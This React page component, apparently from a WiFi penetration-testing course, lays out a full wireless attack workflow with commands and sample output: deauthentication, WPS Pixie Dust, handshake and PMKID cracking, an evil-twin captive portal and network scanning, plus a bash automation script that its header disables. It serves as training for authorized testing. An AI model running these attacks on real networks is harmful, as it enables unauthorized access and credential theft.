import { Map, AlertTriangle, Info, CheckCircle, Target, Lightbulb } from "lucide-react";
import { CommandBlock } from "../CommandBlock";
import { ScriptBlock } from "../ScriptBlock";

const TipBox = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="p-4 rounded-lg border border-accent/40 bg-accent/5 mb-6">
    <div className="flex items-start gap-2 mb-2">
      <Lightbulb className="w-5 h-5 text-accent flex-shrink-0 mt-0.5" />
      <h4 className="font-medium text-accent text-sm">{title}</h4>
    </div>
    <div className="text-sm text-muted-foreground ml-7">{children}</div>
  </div>
);

const PhaseHeader = ({ phase, title, description }: { phase: string; title: string; description: string }) => (
  <div className="mt-12 mb-6 pb-4 border-b border-primary/30">
    <div className="flex items-center gap-3 mb-2">
      <span className="text-xs font-mono px-2 py-1 rounded bg-primary/20 text-primary">{phase}</span>
      <h3 className="text-xl font-bold text-foreground">{title}</h3>
    </div>
    <p className="text-sm text-muted-foreground">{description}</p>
  </div>
);

const fullScript = `#!/bin/bash
# 2027 edition: historical automation disabled; fails before any state change.
printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
exit 64

# ═══════════════════════════════════════════════════════════════
# WiFi Penetration Test — Full Engagement Automation Script
# For authorized security assessments only
# Usage: sudo bash full_engagement.sh <interface> <target_bssid> <target_channel>
# ═══════════════════════════════════════════════════════════════

set -e

IFACE=\${1:-wlan1}
TARGET_BSSID=\${2}
TARGET_CH=\${3}
OUTDIR="./engagement_$(date +%Y%m%d_%H%M%S)"

RED='\\033[0;31m'; GREEN='\\033[0;32m'; YELLOW='\\033[1;33m'; CYAN='\\033[0;36m'; NC='\\033[0m'
log()  { echo -e "\${CYAN}[*]\${NC} \$1"; }
ok()   { echo -e "\${GREEN}[+]\${NC} \$1"; }
warn() { echo -e "\${YELLOW}[!]\${NC} \$1"; }
err()  { echo -e "\${RED}[-]\${NC} \$1"; }

[[ \$EUID -ne 0 ]] && { err "Run as root"; exit 1; }
mkdir -p "\$OUTDIR"

# ── Phase 1: Preparation ──
log "Phase 1 — Preparing interface \$IFACE"
airmon-ng check kill
ip link set \$IFACE down
iw dev \$IFACE set type monitor
ip link set \$IFACE up
MODE=\$(iwconfig \$IFACE 2>/dev/null | grep -oP 'Mode:\\K\\w+')
[[ "\$MODE" != "Monitor" ]] && { err "Monitor mode failed"; exit 1; }
ok "Monitor mode active on \$IFACE"

# ── Phase 2: Passive Recon ──
log "Phase 2 — Passive reconnaissance (30s scan)"
timeout 30 airodump-ng --write "\$OUTDIR/recon" --output-format csv,pcap \$IFACE || true
ok "Recon capture saved to \$OUTDIR/recon*"

# ── Phase 3: Targeted Capture ──
if [ -n "\$TARGET_BSSID" ] && [ -n "\$TARGET_CH" ]; then
    log "Phase 3 — Targeting \$TARGET_BSSID on ch \$TARGET_CH"
    iw dev \$IFACE set channel \$TARGET_CH

    # Start targeted capture in background
    airodump-ng -c \$TARGET_CH --bssid \$TARGET_BSSID -w "\$OUTDIR/target" \$IFACE &
    DUMP_PID=\$!
    sleep 5

    # ── Phase 4: Deauth to force handshake ──
    log "Phase 4 — Sending deauth burst"
    aireplay-ng -0 5 -a \$TARGET_BSSID \$IFACE
    sleep 10

    # Check for handshake
    if aircrack-ng "\$OUTDIR/target-01.cap" 2>/dev/null | grep -q "1 handshake"; then
        ok "WPA handshake captured!"
    else
        warn "No handshake yet — try again or wait for client activity"
    fi
    kill \$DUMP_PID 2>/dev/null

    # ── Phase 5: WPS Check ──
    log "Phase 5 — Checking WPS status"
    wash -i \$IFACE -C 2>/dev/null | grep \$TARGET_BSSID || warn "WPS not detected"

    # ── Phase 6: Crack attempt ──
    log "Phase 6 — Converting capture for hashcat"
    hcxpcapngtool -o "\$OUTDIR/hash.22000" "\$OUTDIR/target-01.cap" 2>/dev/null || \
        warn "hcxpcapngtool not available, use aircrack-ng instead"

    if [ -f "\$OUTDIR/hash.22000" ]; then
        ok "Hash file ready: \$OUTDIR/hash.22000"
        log "Run: hashcat -m 22000 \$OUTDIR/hash.22000 /path/to/wordlist.txt"
    fi
fi

# ── Cleanup ──
log "Restoring interface..."
ip link set \$IFACE down
iw dev \$IFACE set type managed
ip link set \$IFACE up
systemctl restart NetworkManager 2>/dev/null || true
ok "Interface restored. Engagement data in \$OUTDIR/"
ls -la "\$OUTDIR/"`;

export const FullEngagement = () => {
  return (
    <section className="py-16">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          {/* Header */}
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center">
              <Map className="w-5 h-5 text-primary" />
            </div>
            <div>
              <span className="text-xs font-mono text-primary">MODULE 17</span>
              <h2 className="text-2xl font-bold text-foreground">Full Engagement Workflow</h2>
            </div>
          </div>

          <p className="text-muted-foreground mb-4">
            This module compiles every command from the playbook into the exact chronological order you'd 
            follow during a real-world authorized WiFi penetration test — from the moment you power on your 
            rig to the final report. Each command includes <strong className="text-foreground">why</strong> you 
            run it at that specific point in the engagement.
          </p>

          {/* Legal Warning */}
          <div className="p-4 rounded-lg border border-destructive/50 bg-destructive/10 mb-8">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-destructive flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-destructive mb-1">Authorization Required</h4>
                <p className="text-sm text-muted-foreground">
                  Every command in this workflow must only be executed against networks you have explicit 
                  written authorization to test. Unauthorized access is a criminal offense.
                </p>
              </div>
            </div>
          </div>

          {/* ══════════════════════════════════════════════════════════ */}
          {/* PHASE 1 — PRE-ENGAGEMENT */}
          {/* ══════════════════════════════════════════════════════════ */}
          <PhaseHeader
            phase="PHASE 1"
            title="Pre-Engagement & Preparation"
            description="Before you touch a single packet — verify your hardware, drivers, and authorization scope."
          />

          <TipBox title="Real-World Tip: Scope Check">
            <p>Always confirm the scope document lists specific SSIDs, BSSIDs, and approved attack types.
            If WPS attacks aren't approved, skip Phase 5. If deauth is off-limits, rely on passive handshake capture.</p>
          </TipBox>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="lsusb"
              description="Step 1: Verify your adapter is detected"
              explanation="Before anything else, confirm the OS sees your Alfa adapter. Look for 'Realtek Semiconductor' or 'RTL8812AU'. If it's missing, re-seat the USB or try a different port — USB 3.0 ports can sometimes cause issues with 2.4GHz."
              output={`Bus 001 Device 004: ID 0bda:8812 Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac`}
            />

            <CommandBlock
              command="iwconfig"
              description="Step 2: Identify your wireless interfaces"
              explanation="Maps interface names to adapters. Your Alfa is typically wlan1 (wlan0 = built-in). Note the current mode — it should say 'Managed'. This is your baseline."
              output={`wlan0     IEEE 802.11  Mode:Managed  ESSID:"HomeNetwork"
wlan1     IEEE 802.11AC  Mode:Managed  Access Point: Not-Associated`}
            />

            <CommandBlock
              command="iw phy phy1 info | grep -A 10 'valid interface combinations'"
              description="Step 3: Check adapter capabilities"
              explanation="Shows reported interface combinations only. Inspect supported interface modes separately; this does not verify packet injection or operational driver behavior."
            />

            <CommandBlock
              command="sudo airmon-ng check kill"
              description="Step 4: Kill interfering processes"
              explanation="NetworkManager and wpa_supplicant fight with monitor mode for control of the interface. Kill them now. Your Pi should be on Ethernet — this will drop WiFi connections."
              output={`Killing these processes:

    PID Name
   1234 NetworkManager
   1456 wpa_supplicant`}
            />
          </div>

          {/* ══════════════════════════════════════════════════════════ */}
          {/* PHASE 2 — MONITOR MODE */}
          {/* ══════════════════════════════════════════════════════════ */}
          <PhaseHeader
            phase="PHASE 2"
            title="Enable Monitor Mode"
            description="Switch your adapter from normal (managed) mode to monitor mode so it can see ALL wireless traffic."
          />

          <TipBox title="Real-World Tip: iw vs airmon-ng">
            <p>Use <code className="text-primary">iw</code> for more control (no interface renaming). 
            Use <code className="text-primary">airmon-ng start</code> when you want speed. 
            In engagements, I prefer <code className="text-primary">iw</code> because the interface name stays consistent in all my scripts.</p>
          </TipBox>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo ip link set wlan1 down"
              description="Step 5: Bring interface down"
              explanation="You can't change the interface type while it's active. Bring it down first — this is the 'safe' way that avoids driver crashes on some chipsets."
            />

            <CommandBlock
              command="sudo iw dev wlan1 set type monitor"
              description="Step 6: Set monitor mode"
              explanation="Switches the interface from 'managed' (normal WiFi client) to 'monitor' (passive sniffer). In monitor mode, your adapter receives every frame on the current channel — beacons, probes, data, handshakes."
            />

            <CommandBlock
              command="sudo ip link set wlan1 up"
              description="Step 7: Bring interface back up"
              explanation="Activates the interface in monitor mode. It's now listening but not associated to any network."
            />

            <CommandBlock
              command="iwconfig wlan1"
              description="Step 8: Verify monitor mode"
              explanation="Confirm you see 'Mode:Monitor'. If it still says 'Managed', the driver may not support monitor mode or a process reclaimed the interface. Go back to Step 4."
              output={`wlan1     IEEE 802.11AC  Mode:Monitor  Frequency:2.437 GHz  Tx-Power=20 dBm`}
            />
          </div>

          {/* ══════════════════════════════════════════════════════════ */}
          {/* PHASE 3 — PASSIVE RECON */}
          {/* ══════════════════════════════════════════════════════════ */}
          <PhaseHeader
            phase="PHASE 3"
            title="Passive Reconnaissance"
            description="Sit back and listen. Discover every network and client in range without sending a single packet."
          />

          <TipBox title="Real-World Tip: Patience Pays Off">
            <p>Run passive recon for at least 5–10 minutes. Networks on higher channels, 5GHz, or with hidden SSIDs 
            may take time to appear. Rushed recon = missed targets.</p>
          </TipBox>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo airodump-ng wlan1"
              description="Step 9: Full spectrum scan"
              explanation="Hops across all 2.4GHz channels showing every AP and client. Note the BSSID, channel, encryption type, and signal strength (PWR) of your target. Lower PWR number = stronger signal = closer target."
              output={` CH  9 ][ Elapsed: 2 min ][ 2024-03-15 09:45

 BSSID              PWR  Beacons  #Data  CH  ENC    CIPHER AUTH ESSID

 AA:BB:CC:DD:EE:01  -42     312    891   6   WPA2   CCMP   PSK  CorpOffice
 AA:BB:CC:DD:EE:02  -58     189     34  11   WPA2   CCMP   PSK  GuestNet
 AA:BB:CC:DD:EE:03  -71      67      0   1   OPN                FreeWiFi
 AA:BB:CC:DD:EE:04  -65     145     12   6   WPA2   CCMP   PSK  IoT-Devices

 BSSID              STATION            PWR  Frames  Probes

 AA:BB:CC:DD:EE:01  11:22:33:44:55:66  -35     234  CorpOffice
 AA:BB:CC:DD:EE:01  11:22:33:44:55:77  -48      89  
 AA:BB:CC:DD:EE:02  11:22:33:44:55:88  -52      45  GuestNet,HomeWiFi`}
            />

            <CommandBlock
              command="sudo airodump-ng wlan1 --band abg"
              description="Step 10: Include 5GHz networks"
              explanation="Many modern networks use 5GHz (802.11a/ac/ax). The --band abg flag tells airodump to hop across both 2.4GHz and 5GHz channels. Your Alfa AWUS036ACH supports both."
            />

            <CommandBlock
              command="sudo airodump-ng wlan1 --wps"
              description="Step 11: Check for WPS-enabled networks"
              explanation="Adds a WPS column to the output. Networks with WPS enabled are potentially vulnerable to Pixie Dust or brute-force PIN attacks — an easier win than cracking WPA2."
            />
          </div>

          {/* What to note */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h4 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Info className="w-5 h-5 text-primary" />
              What to Record During Recon
            </h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm text-muted-foreground">
              <div>
                <p className="text-foreground font-medium mb-1">For Each Target AP:</p>
                <ul className="space-y-1">
                  <li>• <strong>BSSID</strong> — MAC address of the AP</li>
                  <li>• <strong>Channel</strong> — Lock to this for all subsequent attacks</li>
                  <li>• <strong>Encryption</strong> — WPA2-PSK, WPA3-SAE, WEP, OPN</li>
                  <li>• <strong>Signal (PWR)</strong> — Closer = faster results</li>
                  <li>• <strong>WPS</strong> — Enabled/Locked/Disabled</li>
                </ul>
              </div>
              <div>
                <p className="text-foreground font-medium mb-1">For Each Client:</p>
                <ul className="space-y-1">
                  <li>• <strong>Station MAC</strong> — Target for deauth</li>
                  <li>• <strong>Associated AP</strong> — Which network they're on</li>
                  <li>• <strong>Probes</strong> — Networks they're searching for</li>
                  <li>• <strong>Frame count</strong> — Active vs idle clients</li>
                </ul>
              </div>
            </div>
          </div>

          {/* ══════════════════════════════════════════════════════════ */}
          {/* PHASE 4 — TARGETED CAPTURE */}
          {/* ══════════════════════════════════════════════════════════ */}
          <PhaseHeader
            phase="PHASE 4"
            title="Targeted Handshake Capture"
            description="Lock onto your target network and capture the WPA 4-way handshake."
          />

          <TipBox title="Real-World Tip: Two Terminals">
            <p>Always run airodump-ng in one terminal and aireplay-ng in another. The capture must be running 
            BEFORE you send the deauth, or you'll miss the handshake when the client reconnects.</p>
          </TipBox>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:01 -w engagement wlan1"
              description="Step 12: Lock onto target AP (Terminal 1)"
              explanation="-c 6 locks your adapter to channel 6 (no more hopping). --bssid filters to only your target. -w saves the capture. This MUST stay running while you deauth in the next step."
            />

            <CommandBlock
              command="sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:01 -c 11:22:33:44:55:66 wlan1"
              description="Step 13: Targeted deauthentication (Terminal 2)"
              explanation="-0 5 sends 5 deauth frames. -a is the AP BSSID. -c targets a specific client (better success rate than broadcast). The client disconnects and reconnects — airodump-ng captures the handshake during reconnection."
              output={`09:52:16  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:01) on channel 6
09:52:16  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66]
09:52:17  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66]`}
            />

            <CommandBlock
              command="# Watch airodump-ng for: [ WPA handshake: AA:BB:CC:DD:EE:01 ]"
              description="Step 14: Confirm handshake capture"
              explanation="In the airodump-ng terminal, look for 'WPA handshake: <BSSID>' in the top-right corner. If it appears, you've got it. If not, try deauthing a different client or wait for natural reconnections."
            />

            <CommandBlock
              command="aircrack-ng engagement-01.cap"
              description="Step 15: Verify the capture file"
              explanation="Quick sanity check — confirms the .cap file contains a valid handshake. If it says '0 handshakes', the capture failed and you need to repeat Steps 12–13."
              output={`Opening engagement-01.cap
Read 8924 packets.

   #  BSSID              ESSID                 Encryption  1 handshake

   1  AA:BB:CC:DD:EE:01   CorpOffice            WPA (1 handshake)`}
            />
          </div>

          {/* ══════════════════════════════════════════════════════════ */}
          {/* PHASE 5 — WPS ATTACK (IF AVAILABLE) */}
          {/* ══════════════════════════════════════════════════════════ */}
          <PhaseHeader
            phase="PHASE 5"
            title="WPS Attack (If Enabled)"
            description="If WPS is enabled and not locked, try Pixie Dust first — it's instant. Fall back to brute force if needed."
          />

          <TipBox title="Real-World Tip: Why WPS First?">
            <p>WPS Pixie Dust can recover the WPA passphrase in seconds — no wordlist needed. 
            Always check for WPS before spending hours cracking a handshake. Many IoT devices and older routers still have WPS enabled.</p>
          </TipBox>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo wash -i wlan1 -C"
              description="Step 16: Scan for WPS-enabled APs"
              explanation="-C ignores frame check sequence errors (common with some drivers). Look for targets where 'Lck' column shows 'No' — this is currently unlocked, not proof of exploitability. 'Yes' means WPS is rate-limited."
              output={`BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
AA:BB:CC:DD:EE:01    6  -42  2.0  No   Netgear   CorpOffice
AA:BB:CC:DD:EE:04    6  -65  1.0  Yes  TP-Link   IoT-Devices`}
            />

            <CommandBlock
              command="sudo reaver -i wlan1 -b AA:BB:CC:DD:EE:01 -c 6 -K"
              description="Step 17: Pixie Dust attack"
              explanation="-K enables Pixie Dust (offline WPS PIN calculation). This exploits weak random number generation in the WPS handshake. If the router is vulnerable, recovery may be possible; timing and success are not guaranteed."
              output={`[+] Waiting for beacon from AA:BB:CC:DD:EE:01
[+] Received beacon from AA:BB:CC:DD:EE:01
[+] Trying pin "12345670"
[+] Sending EAPOL START request
[+] Pixie-Dust attack — computingass...
[+] WPS pin:  12345670
[+] WPA PSK:  SuperSecretPass123
[+] AP SSID:  CorpOffice`}
            />

            <CommandBlock
              command="sudo bully -b AA:BB:CC:DD:EE:01 -c 6 -d wlan1"
              description="Step 18: Alternative — Bully (if Reaver fails)"
              explanation="Bully is an alternative WPS brute-forcer. -d enables Pixie Dust mode. Some routers respond better to Bully's implementation than Reaver's."
            />

            <CommandBlock
              command="sudo reaver -i wlan1 -b AA:BB:CC:DD:EE:01 -c 6 -vv -d 2 -N"
              description="Step 19: WPS brute force (last resort)"
              explanation="If Pixie Dust fails, try online brute force. -d 2 adds a 2-second delay between attempts to avoid lockouts. -N disables NACK detection. Completion is not guaranteed; lockouts, implementation differences and authorization limits may prevent testing. A delay is not a lockout guarantee."
            />
          </div>

          {/* ══════════════════════════════════════════════════════════ */}
          {/* PHASE 6 — CRACKING THE HANDSHAKE */}
          {/* ══════════════════════════════════════════════════════════ */}
          <PhaseHeader
            phase="PHASE 6"
            title="Cracking the Handshake"
            description="Convert the capture and throw your best wordlists and rules at it."
          />

          <TipBox title="Real-World Tip: Cracking Strategy">
            <p>Start with targeted wordlists (company name variations, address, phone numbers). 
            If that fails, move to rockyou.txt. Then try rule-based attacks. GPU cracking with hashcat 
            is 50-100x faster than CPU — always use hashcat over aircrack-ng for serious jobs.</p>
          </TipBox>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="hcxpcapngtool -o hash.22000 engagement-01.cap"
              description="Step 20: Convert capture to hashcat format"
              explanation="Converts the .cap file to hashcat's .22000 format (WPA-PBKDF2-PMKID+EAPOL). This modern format is more efficient and supports both PMKID and handshake attacks in one file."
            />

            <CommandBlock
              command="aircrack-ng -w /usr/share/wordlists/rockyou.txt engagement-01.cap"
              description="Step 21: Quick crack with aircrack-ng (CPU)"
              explanation="Fast way to try common passwords. Good for quick wins and supports multiple CPU cores; performance varies by workload. Use this for initial testing, then switch to hashcat for serious cracking."
            />

            <CommandBlock
              command="hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt"
              description="Step 22: GPU-accelerated crack with hashcat"
              explanation="-m 22000 is the hash mode for WPA. Hashcat uses your GPU for massive parallelism. A decent GPU tests millions of passwords per second vs thousands on CPU."
            />

            <CommandBlock
              command="hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
              description="Step 23: Rule-based attack"
              explanation="Rules mutate each wordlist entry (capitalize, append numbers, leet speak). best64.rule applies the 64 most effective transformations. This catches passwords like 'Password1!' that aren't in wordlists."
            />

            <CommandBlock
              command="hashcat -m 22000 hash.22000 -a 3 '?d?d?d?d?d?d?d?d'"
              description="Step 24: Brute-force 8-digit PINs"
              explanation="-a 3 is brute-force mode. ?d = digit. This tries all 8-digit combinations (00000000–99999999). Many default router passwords are 8 digits — this is very effective against default configs."
            />

            <CommandBlock
              command="hashcat -m 22000 hash.22000 --show"
              description="Step 25: Display cracked password"
              explanation="Once hashcat finds the password, use --show to display it. The output format is hash:password."
            />
          </div>

          {/* ══════════════════════════════════════════════════════════ */}
          {/* PHASE 7 — PMKID ATTACK */}
          {/* ══════════════════════════════════════════════════════════ */}
          <PhaseHeader
            phase="PHASE 7"
            title="PMKID Attack (Clientless)"
            description="Capture the PMKID from the AP itself — no deauth needed, no client required."
          />

          <TipBox title="Real-World Tip: Why PMKID Matters">
            <p>PMKID attacks work even when no clients are connected. You only need to initiate an association 
            with the AP. Not all routers are vulnerable, but it's always worth trying first — it's stealthier 
            than deauth attacks.</p>
          </TipBox>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo hcxdumptool -i wlan1 -o pmkid_dump.pcapng --filterlist_ap=targets.txt --filtermode=2 --enable_status=3"
              description="Step 26: Capture PMKID"
              explanation="hcxdumptool associates with APs and captures the PMKID from the first EAPOL message. Put target BSSIDs in targets.txt (one per line). Let it run for 1-2 minutes per target."
            />

            <CommandBlock
              command="hcxpcapngtool -o pmkid.22000 pmkid_dump.pcapng"
              description="Step 27: Convert PMKID capture"
              explanation="Extracts the PMKID hash from the capture file into hashcat format. If the AP provided a PMKID, this file will contain a crackable hash."
            />

            <CommandBlock
              command="hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt"
              description="Step 28: Crack PMKID"
              explanation="Same hashcat command as handshake cracking — mode 22000 handles both. If the password is in your wordlist, you're in."
            />
          </div>

          {/* ══════════════════════════════════════════════════════════ */}
          {/* PHASE 8 — EVIL TWIN */}
          {/* ══════════════════════════════════════════════════════════ */}
          <PhaseHeader
            phase="PHASE 8"
            title="Evil Twin (If Other Methods Fail)"
            description="When cracking fails, social-engineer the password from the users themselves."
          />

          <TipBox title="Real-World Tip: Evil Twin Strategy">
            <p>Evil Twin is your fallback when the password is too complex to crack. Clone the target SSID, 
            deauth all clients, and serve a convincing captive portal. This requires a second wireless adapter 
            (one for the fake AP, one for deauth).</p>
          </TipBox>

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo airbase-ng -e 'CorpOffice' -c 6 wlan1"
              description="Step 29: Create rogue AP (basic method)"
              explanation="Creates a fake AP with the same SSID as the target. Clients may auto-connect if you deauth them from the real AP. For a more convincing attack, use hostapd with a captive portal."
            />

            <CommandBlock
              command="sudo wifipumpkin3"
              description="Step 30: Advanced Evil Twin with Wifipumpkin3"
              explanation="Full-featured Evil Twin framework with built-in captive portal, DNS spoofing, credential harvesting, and traffic interception. Much more realistic than airbase-ng."
            />

            <CommandBlock
              command="sudo airgeddon"
              description="Step 31: Automated Evil Twin with Airgeddon"
              explanation="Menu-driven framework that automates the entire Evil Twin process including handshake-based WPA password verification — if the user enters a password, it checks it against the captured handshake."
            />
          </div>

          {/* ══════════════════════════════════════════════════════════ */}
          {/* PHASE 9 — POST-EXPLOITATION */}
          {/* ══════════════════════════════════════════════════════════ */}
          <PhaseHeader
            phase="PHASE 9"
            title="Post-Exploitation & Verification"
            description="You're in. Now document everything and verify the access."
          />

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="nmcli dev wifi connect 'CorpOffice' password 'CrackedPassword123'"
              description="Step 32: Connect to the network"
              explanation="Verify the cracked password works by actually connecting. This is proof-of-concept for your report. Note the IP address assigned."
            />

            <CommandBlock
              command="ip addr show wlan1"
              description="Step 33: Confirm network access"
              explanation="Check that you received a valid IP address from the network's DHCP server. This confirms full network access."
            />

            <CommandBlock
              command="nmap -sn 192.168.1.0/24"
              description="Step 34: Discover network hosts"
              explanation="Quick ping sweep to find all live devices on the network. This shows the scope of access gained — servers, printers, IoT devices, workstations."
              output={`Nmap scan report for 192.168.1.1 (router)
Nmap scan report for 192.168.1.10 (fileserver)
Nmap scan report for 192.168.1.15 (printer)
Nmap scan report for 192.168.1.20 (workstation)
Nmap done: 256 IP addresses (4 hosts up)`}
            />

            <CommandBlock
              command="nmap -sV -p- 192.168.1.1"
              description="Step 35: Scan router services"
              explanation="Full port scan with service version detection on the router/gateway. Look for admin panels (80/443), SSH (22), Telnet (23), and other management interfaces."
            />
          </div>

          {/* ══════════════════════════════════════════════════════════ */}
          {/* PHASE 10 — CLEANUP */}
          {/* ══════════════════════════════════════════════════════════ */}
          <PhaseHeader
            phase="PHASE 10"
            title="Cleanup & Reporting"
            description="Restore everything to its original state and compile your findings."
          />

          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo ip link set wlan1 down && sudo iw dev wlan1 set type managed && sudo ip link set wlan1 up"
              description="Step 36: Restore managed mode"
              explanation="Always restore your adapter to managed mode when done. Leaving it in monitor mode can cause issues and is unprofessional."
            />

            <CommandBlock
              command="sudo systemctl restart NetworkManager"
              description="Step 37: Restart network services"
              explanation="Brings back NetworkManager so normal WiFi connections work again."
            />

            <CommandBlock
              command="ls -la engagement-01.* captures/ *.22000"
              description="Step 38: Inventory your evidence files"
              explanation="List all capture files, hashes, and evidence. These go into your report. Keep them secure — they contain sensitive network data."
            />
          </div>

          {/* Decision Flowchart */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h4 className="font-semibold text-foreground mb-4 flex items-center gap-2">
              <Target className="w-5 h-5 text-primary" />
              Attack Decision Flowchart
            </h4>
            <div className="font-mono text-xs text-muted-foreground space-y-1">
              <p className="text-foreground font-medium">Start → Recon (Phase 3)</p>
              <p className="ml-4">├─ WPS Enabled & Unlocked? → <span className="text-success">Pixie Dust (Phase 5)</span> → Got PSK? → Done ✓</p>
              <p className="ml-4">├─ Clients Connected? → <span className="text-warning">Deauth + Handshake (Phase 4)</span> → Crack (Phase 6)</p>
              <p className="ml-4">├─ No Clients? → <span className="text-primary">PMKID Attack (Phase 7)</span> → Crack (Phase 6)</p>
              <p className="ml-4">├─ Cracking Failed? → <span className="text-accent">Evil Twin (Phase 8)</span></p>
              <p className="ml-4">└─ Password Obtained → <span className="text-success">Post-Exploitation (Phase 9)</span> → Report (Phase 10)</p>
            </div>
          </div>

          {/* Full Automation Script */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Full Engagement Automation Script</h3>
          <p className="text-sm text-muted-foreground mb-4">
            This script automates Phases 1–6 (prep through cracking). Run with: <code className="text-primary">sudo bash full_engagement.sh wlan1 AA:BB:CC:DD:EE:01 6</code>
          </p>

          <ScriptBlock
            title="Full Engagement Automation"
            filename="full_engagement.sh"
            language="bash"
            code={fullScript}
            description="Automated script covering preparation, monitor mode, recon, targeted capture, deauth, WPS check, and hash conversion. Review and customize before use."
          />

          {/* Summary */}
          <div className="mt-8 p-5 rounded-xl border border-success/30 bg-success/5">
            <div className="flex items-start gap-3">
              <CheckCircle className="w-5 h-5 text-success flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-success mb-2">Workflow Complete</h4>
                <p className="text-sm text-muted-foreground">
                  You now have the full chronological workflow — from plugging in your adapter to writing the final report. 
                  Every real engagement follows this pattern. The art is knowing which phases to emphasize based on 
                  what recon tells you. Practice each phase individually in the other modules, then come back here 
                  to run the full chain.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};
